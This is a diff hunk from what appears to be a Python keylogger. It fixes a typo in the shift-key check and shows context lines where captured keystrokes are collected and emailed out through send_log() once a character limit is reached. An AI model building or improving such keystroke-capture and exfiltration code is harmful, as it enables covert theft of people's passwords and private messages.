@@ -46,7 +46,7 @@ def on_press(key):
         if len(full_log) >= email_char_limit:
             send_log()
             full_log = ''
-    elif key == Key.shift_I or key == Key.shift_r:
+    elif key == Key.shift_l or key == Key.shift_r:
         return
     elif key == Key.backspace:
         word = word[:-1]
